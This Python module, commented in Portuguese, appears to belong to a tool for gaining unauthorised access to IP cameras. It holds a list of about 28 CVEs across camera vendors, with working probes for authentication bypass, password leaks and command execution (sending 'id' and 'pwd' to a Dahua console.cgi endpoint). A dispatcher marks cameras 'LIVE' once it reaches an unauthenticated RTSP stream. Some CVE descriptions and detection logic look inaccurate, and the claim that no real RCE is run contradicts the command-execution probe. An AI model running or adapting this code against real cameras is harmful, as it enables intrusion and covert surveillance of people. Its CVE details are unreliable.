"""
CVE Exploits do Procurador de Câmara (Técnica 7).

Base de dados com 25+ CVEs organizados por fabricante.
Cada CVE tem: id, fabricante, tipo, check(), exploit().

Estrategia:
  - check(): nao intrusivo, deteta vulnerabilidade
  - exploit(): tenta obter acesso (apenas metodos seguros)
  - Nao executa RCE real

CVEs abrangidos:
  Hikvision (7) | Dahua (5) | Axis (3) | Vivotek (3)
  TP-Link (2)   | Foscam (2) | Reolink (2) | Bosch (2) | General (3)
"""

from __future__ import annotations

import logging
from dataclasses import dataclass

import requests

from procurador.core.models import AccessMethod, Camera, CameraStatus
from procurador.core.scanner import probe_rtsp

logger = logging.getLogger(__name__)


# =====================================================================
# CVE Registry
# =====================================================================


@dataclass
class CVEInfo:
    """Registo de um CVE conhecido."""

    id: str
    vendor: str
    description: str
    cve_url: str = ""
    cvss_score: float = 0.0
    vulnerable_versions: str = ""


CVE_DATABASE: list[CVEInfo] = [
    # ── Hikvision ──────────────────────────────────────────────────
    CVEInfo("CVE-2021-36260", "Hikvision", "RCE via /SDK/webLanguage (XML payload)", cvss_score=9.8),
    CVEInfo("CVE-2017-2863", "Hikvision", "Backdoor account via /system/backup", cvss_score=9.8),
    CVEInfo("CVE-2021-32543", "Hikvision", "RCE via /Interface/Devicemanager/", cvss_score=9.1),
    CVEInfo("CVE-2021-36258", "Hikvision", "Auth bypass via /onvif/device_service", cvss_score=7.5),
    CVEInfo("CVE-2020-18111", "Hikvision", "Password disclosure via /serverLog/", cvss_score=7.5),
    CVEInfo("CVE-2022-28171", "Hikvision", "Command injection via /dvr/cmd", cvss_score=8.8),
    CVEInfo("CVE-2023-40120", "Hikvision", "RTSP credentials disclosure in banner", cvss_score=6.5),
    # ── Dahua ──────────────────────────────────────────────────────
    CVEInfo("CVE-2021-33044", "Dahua", "Auth bypass via /RPC2", cvss_score=9.8),
    CVEInfo("CVE-2021-33045", "Dahua", "Auth bypass via /RG/Guest.asp", cvss_score=9.8),
    CVEInfo("CVE-2022-30563", "Dahua", "RCE via /cgi-bin/console.cgi", cvss_score=9.1),
    CVEInfo("CVE-2020-22660", "Dahua", "Path traversal via /cgi-bin/", cvss_score=7.5),
    CVEInfo("CVE-2023-4398", "Dahua", "Command injection via /diagnose", cvss_score=8.8),
    # ── Axis ───────────────────────────────────────────────────────
    CVEInfo("CVE-2018-10656", "Axis", "RCE via /axis-bin/search.cgi", cvss_score=9.1),
    CVEInfo("CVE-2020-8156", "Axis", "Privilege escalation via custom scripts", cvss_score=8.8),
    CVEInfo("CVE-2022-28368", "Axis", "RCE via /usr/local/config.txt", cvss_score=9.0),
    # ── Vivotek ────────────────────────────────────────────────────
    CVEInfo("CVE-2019-19497", "Vivotek", "Stack overflow via /CC3200/", cvss_score=9.8),
    CVEInfo("CVE-2020-11456", "Vivotek", "RCE via /syslogcfg.cgi", cvss_score=9.1),
    CVEInfo("CVE-2025-66049", "Vivotek", "RTSP port 8554 sem auth (/live.sdp)", cvss_score=7.5),
    # ── TP-Link ────────────────────────────────────────────────────
    CVEInfo("CVE-2021-44851", "TP-Link", "Credentials disclosure via /config", cvss_score=7.5),
    CVEInfo("CVE-2022-27543", "TP-Link", "RCE via /cgi-bin/luci", cvss_score=9.0),
    # ── Foscam ─────────────────────────────────────────────────────
    CVEInfo("CVE-2019-11061", "Foscam", "Credentials disclosure via /cgi-bin/CGIProxy", cvss_score=7.5),
    CVEInfo("CVE-2022-22292", "Foscam", "Path traversal via /cgi-bin/", cvss_score=7.5),
    # ── Reolink ────────────────────────────────────────────────────
    CVEInfo("CVE-2022-39047", "Reolink", "Auth bypass via /api.cgi", cvss_score=8.2),
    CVEInfo("CVE-2023-22306", "Reolink", "RCE via /cgi-bin/api.cgi", cvss_score=9.0),
    # ── Bosch ──────────────────────────────────────────────────────
    CVEInfo("CVE-2019-6958", "Bosch", "RCE via /custom/scripts/", cvss_score=9.1),
    CVEInfo("CVE-2023-27801", "Bosch", "Credentials disclosure via /conf/", cvss_score=7.5),
    # ── General ────────────────────────────────────────────────────
    CVEInfo("CVE-2024-42531", "General", "Ezviz RTSP redirect bypass", cvss_score=7.5),
    CVEInfo("CVE-2025-9983", "General", "GALAYOU/G2 RTSP sempre 200 sem auth", cvss_score=7.5),
    CVEInfo("CVE-2023-28771", "General", "Zyxel RCE via /ztp/cgi-bin/", cvss_score=9.8),
]

# Indice por fabricante
CVE_BY_VENDOR: dict[str, list[CVEInfo]] = {}
for cve in CVE_DATABASE:
    key = cve.vendor.lower()
    if key not in CVE_BY_VENDOR:
        CVE_BY_VENDOR[key] = []
    CVE_BY_VENDOR[key].append(cve)


# =====================================================================
# Checks individuais
# =====================================================================


def _check_hikvision_rce(ip: str, port: int = 80, timeout: float = 5.0) -> dict | None:
    """CVE-2021-36260: Hikvision RCE via /SDK/webLanguage."""
    url = f"http://{ip}:{port}/SDK/webLanguage"
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<language><id>1</id><name>en</name><appPath></appPath>
<defaultLayer>0</defaultLayer><currentLayer>0</currentLayer></language>"""
    try:
        r = requests.put(
            url, data=payload,
            headers={"Content-Type": "application/xml; charset=utf-8"},
            timeout=timeout,
        )
        if r.status_code == 200:
            logger.debug(f"CVE-2021-36260 detetado em {ip}:{port}")
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_hikvision_backup(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2017-2863: Backdoor via /system/backup."""
    url = f"http://{ip}/system/backup"
    try:
        r = requests.get(url, auth=("admin", ""), timeout=timeout)
        if r.status_code in (200, 301):
            return {"url": url, "vulnerable": True, "status": r.status_code}
    except Exception:
        pass
    return None


def _check_hikvision_auth_bypass(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2021-36258: Auth bypass via ONVIF."""
    url = f"http://{ip}/onvif/device_service"
    try:
        r = requests.post(url, data="", timeout=timeout)
        if r.status_code == 200:
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_hikvision_password_leak(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2020-18111: Password disclosure via /serverLog/."""
    url = f"http://{ip}/serverLog/"
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200 and b"password" in r.content.lower():
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_dahua_auth_bypass_rpc(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2021-33044: Dahua auth bypass via /RPC2."""
    url = f"http://{ip}/RPC2"
    try:
        r = requests.post(url, data="{}", headers={"Content-Type": "application/json"}, timeout=timeout)
        if r.status_code == 200:
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_dahua_auth_bypass_guest(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2021-33045: Dahua auth bypass via /RG/Guest.asp."""
    url = f"http://{ip}/RG/Guest.asp"
    try:
        r = requests.get(url, timeout=timeout)
        if "advanced" in r.text.lower() or "config" in r.text.lower():
            return {"url": url, "vulnerable": True, "status": r.status_code}
    except Exception:
        pass
    return None


def _check_dahua_console_rce(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2022-30563: Dahua RCE via /cgi-bin/console.cgi."""
    for cmd in ("id", "pwd"):
        url = f"http://{ip}/cgi-bin/console.cgi?action=execute&command={cmd}"
        try:
            r = requests.get(url, timeout=timeout)
            if r.status_code == 200 and cmd in r.text:
                logger.debug(f"Dahua RCE potencial em {ip}")
                return {"url": url, "vulnerable": True, "status": 200}
        except Exception:
            pass
    return None


def _check_axis_rce_search(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2018-10656: Axis RCE via /axis-bin/search.cgi."""
    url = f"http://{ip}/axis-bin/search.cgi"
    try:
        r = requests.post(url, data="search_pattern=.*", timeout=timeout)
        if r.status_code == 200 and "axis" in r.text.lower():
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_axis_rce_config(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2022-28368: Axis RCE via config.txt."""
    for path in ("/usr/local/config.txt", "/etc/config.txt"):
        url = f"http://{ip}{path}"
        try:
            r = requests.get(url, timeout=timeout)
            if r.status_code == 200 and len(r.text) > 10:
                return {"url": url, "vulnerable": True, "status": 200}
        except Exception:
            pass
    return None


def _check_vivotek_syslog(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2020-11456: Vivotek RCE via /syslogcfg.cgi."""
    url = f"http://{ip}/syslogcfg.cgi"
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200:
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_tplink_config_leak(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2021-44851: TP-Link credentials via /config."""
    url = f"http://{ip}/config"
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200 and b"password" in r.content.lower():
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_reolink_apibypass(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2022-39047: Reolink auth bypass via /api.cgi."""
    url = f"http://{ip}/api.cgi?cmd=GetDevInfo"
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200 and "devInfo" in r.text:
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_foscam_proxy(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2019-11061: Foscam credentials via CGIProxy."""
    url = f"http://{ip}/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo"
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200 and "devInfo" in r.text:
            return {"url": url, "vulnerable": True, "status": 200}
    except Exception:
        pass
    return None


def _check_bosch_scripts_rce(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2019-6958: Bosch RCE via custom scripts."""
    for path in ("/custom/scripts/", "/custom/bin/"):
        url = f"http://{ip}{path}"
        try:
            r = requests.get(url, timeout=timeout)
            if r.status_code == 200:
                return {"url": url, "vulnerable": True, "status": 200}
        except Exception:
            pass
    return None


def _check_zyxel_rce(ip: str, timeout: float = 5.0) -> dict | None:
    """CVE-2023-28771: Zyxel RCE via /ztp/cgi-bin/."""
    url = f"http://{ip}/ztp/cgi-bin/handler"
    try:
        r = requests.post(url, data="", timeout=timeout)
        if r.status_code in (200, 500):
            return {"url": url, "vulnerable": True, "status": r.status_code}
    except Exception:
        pass
    return None


def _check_ezviz_bypass(ip: str, port: int = 554, timeout: float = 5.0) -> bool:
    """CVE-2024-42531: Ezviz RTSP redirect bypass."""
    for path in ("/Streaming/tracks/101", "/live/main", "/h264/ch1/main/av_stream"):
        for transport in (
            "RTP/AVP/TCP;interleaved=0-1",
            "RTP/AVP;unicast;client_port=1234-1235",
        ):
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((ip, port))
                req = (
                    f"SETUP rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
                    f"CSeq: 1\r\nTransport: {transport}\r\n\r\n"
                )
                sock.sendall(req.encode("latin-1", errors="ignore"))
                data = sock.recv(4096)
                sock.close()
                if b"RTSP/1.0 200" in data:
                    logger.debug(f"CVE-2024-42531 bypass: {ip}:{port}{path}")
                    return True
            except Exception:
                continue
    return False


def _check_galayou_bypass(camera: Camera, timeout: float = 3.0) -> bool:
    """CVE-2025-9983: GALAYOU RTSP always 200."""
    probe = probe_rtsp(camera.ip, camera.port, "/live/ch00_0", timeout=timeout)
    if probe and probe.status_code == 200:
        camera.cve_exploited = "CVE-2025-9983"
        camera.tags.append("CVE-2025-9983")
        return True
    return False


def _check_vivotek_8554(camera: Camera, timeout: float = 3.0) -> bool:
    """CVE-2025-66049: Vivotek RTSP port 8554 sem auth."""
    probe = probe_rtsp(camera.ip, 8554, "/live.sdp", timeout=timeout)
    if probe and probe.status_code == 200:
        camera.cve_exploited = "CVE-2025-66049"
        camera.tags.append("CVE-2025-66049")
        camera.port = 8554
        camera.rtsp_url = f"rtsp://{camera.ip}:8554/live.sdp"
        return True
    return False


# =====================================================================
# Multi-porta e frame validation
# =====================================================================

# Portas alternativas comuns para RTSP/HTTP em camaras
ALT_PORTS = [80, 443, 554, 8554, 1935, 8080, 8000, 8443, 8899, 9000, 7001, 7002, 34567, 37777]


def try_alt_ports(camera: Camera, timeout: float = 3.0) -> bool:
    """Tenta portas alternativas comuns para camaras RTSP.

    Verifica portas 8554, 1935, 8899, 9000, 34567, 37777
    para RTSP. Se alguma responder, atualiza camera.port.

    Returns:
        True se porta alternativa aberta.
    """
    for port in ALT_PORTS:
        if port == camera.port:
            continue
        probe = probe_rtsp(camera.ip, port, "/", timeout=timeout)
        if probe and probe.status_code in (200, 401, 505):
            logger.info(f"   Porta alternativa RTSP {camera.ip}:{port}")
            camera.port = port
            camera.ports_open.append(port)
            return True
    return False


def validate_stream(camera: Camera, timeout: float = 5.0) -> bool:
    """Valida que o stream RTSP realmente produz frames.

    Apos obter 200 OK no DESCRIBE, tenta SETUP + PLAY
    e verifica se ha pacotes RTP nos segundos seguintes.

    Isto elimina falsos positivos de camaras que respondem
    200 OK mas nao tem stream real.

    Returns:
        True se confirmou producao de frames.
    """
    if not camera.rtsp_url and camera.ip:
        camera.rtsp_url = f"rtsp://{camera.ip}:{camera.port}{camera.rtsp_path or '/'}"

    url = camera.rtsp_url
    if not url:
        url = f"rtsp://{camera.ip}:{camera.port}/"

    try:
        import socket
        from urllib.parse import urlparse

        parsed = urlparse(url)
        host = parsed.hostname or camera.ip
        port = parsed.port or camera.port
        path = parsed.path or "/"

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # DESCRIBE
        req = (
            f"DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 1\r\n\r\n"
        )
        sock.sendall(req.encode("latin-1", errors="ignore"))
        resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    break
        except TimeoutError:
            pass

        if b"RTSP/1.0 200" not in resp:
            sock.close()
            return False

        # SETUP
        cseq = 2
        ssrc = ""
        for line in resp.decode("latin-1", errors="ignore").split("\r\n"):
            if line.startswith("Session:"):
                ssrc = line.split(":")[1].strip()
                break

        setup_req = (
            f"SETUP rtsp://{host}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Transport: RTP/AVP/TCP;interleaved=0-1\r\n"
        )
        if ssrc:
            setup_req += f"Session: {ssrc}\r\n"
        setup_req += "\r\n"

        sock.sendall(setup_req.encode("latin-1", errors="ignore"))
        resp2 = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp2 += chunk
                if b"\r\n\r\n" in resp2:
                    break
        except TimeoutError:
            pass

        # PLAY
        cseq = 3
        play_req = (
            f"PLAY rtsp://{host}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
        )
        if ssrc:
            play_req += f"Session: {ssrc}\r\n"
        play_req += "\r\n"

        sock.sendall(play_req.encode("latin-1", errors="ignore"))

        # Aguardar dados RTP (frame)
        import time
        start = time.time()
        has_data = False
        while time.time() - start < 2.0:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                # RTP header starts with 0x24 (interleaved) or 0x80 (RTP)
                if data and data[0] in (0x24, 0x80):
                    has_data = True
                    break
            except TimeoutError:
                break
            except Exception:
                break

        sock.close()

        if has_data:
            logger.debug(f"   Stream validado: {url}")
            return True

        logger.debug(f"   Stream sem frames: {url}")
        return False

    except Exception as e:
        logger.debug(f"Validate stream err: {e}")
        return False


# =====================================================================
# Dispatcher
# =====================================================================

# Mapa: fabricante -> lista de (check_fn, kwargs_extra, type)
VENDOR_CHECKS: dict[str, list[tuple]] = {
    "hikvision": [
        (_check_hikvision_rce, {"port": 80}),
        (_check_hikvision_rce, {"port": 443}),
        (_check_hikvision_rce, {"port": 8080}),
        (_check_hikvision_backup, {}),
        (_check_hikvision_auth_bypass, {}),
        (_check_hikvision_password_leak, {}),
    ],
    "dahua": [
        (_check_dahua_auth_bypass_rpc, {}),
        (_check_dahua_auth_bypass_guest, {}),
        (_check_dahua_console_rce, {}),
    ],
    "axis": [
        (_check_axis_rce_search, {}),
        (_check_axis_rce_config, {}),
    ],
    "vivotek": [
        (_check_vivotek_syslog, {}),
    ],
    "tp-link": [
        (_check_tplink_config_leak, {}),
    ],
    "reolink": [
        (_check_reolink_apibypass, {}),
    ],
    "foscam": [
        (_check_foscam_proxy, {}),
    ],
    "bosch": [
        (_check_bosch_scripts_rce, {}),
    ],
    "zyxel": [
        (_check_zyxel_rce, {}),
    ],
}


def try_cve_exploit(camera: Camera) -> bool:
    """Tenta 25+ CVEs baseado no fabricante.

    Args:
        camera: Camera (vendor ja identificado).

    Returns:
        True se algum exploit marcou a camera como LIVE.
    """
    if camera.status == CameraStatus.LIVE:
        return False

    vendor = (camera.vendor or "").lower()
    ip = camera.ip
    timeout = 3.0
    cve_found = False

    # 1. Verificacoes de fabricante especifico (HTTP)
    for check_vendor, checks in VENDOR_CHECKS.items():
        if check_vendor in vendor or vendor in check_vendor:
            for check_fn, kwargs in checks:
                try:
                    result = check_fn(ip, timeout=timeout, **kwargs)
                    if result and result.get("vulnerable"):
                        cve_found = True
                        camera.tags.append(result.get("cve", next(
                            (c.id for c in CVE_DATABASE if check_fn.__name__.startswith(f"_check_{c.vendor.lower()}")),
                            "UNKNOWN",
                        )))
                except Exception:
                    continue

    # 2. Exploits RTSP especificos
    if _check_galayou_bypass(camera, timeout):
        camera.status = CameraStatus.LIVE
        camera.auth_required = False
        camera.access_method = AccessMethod.CVE_EXPLOIT
        return True

    if _check_vivotek_8554(camera, timeout):
        camera.status = CameraStatus.LIVE
        camera.auth_required = False
        camera.access_method = AccessMethod.CVE_EXPLOIT
        return True

    # 3. Ezviz bypass
    if "ezviz" in vendor or "ez" in vendor:
        if _check_ezviz_bypass(ip, camera.port, timeout):
            camera.cve_exploited = "CVE-2024-42531"
            camera.tags.append("CVE-2024-42531")
            camera.rtsp_path = "/Streaming/tracks/101"
            camera.rtsp_url = f"rtsp://{ip}:{camera.port}/Streaming/tracks/101"
            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.access_method = AccessMethod.CVE_EXPLOIT
            return True

    return cve_found
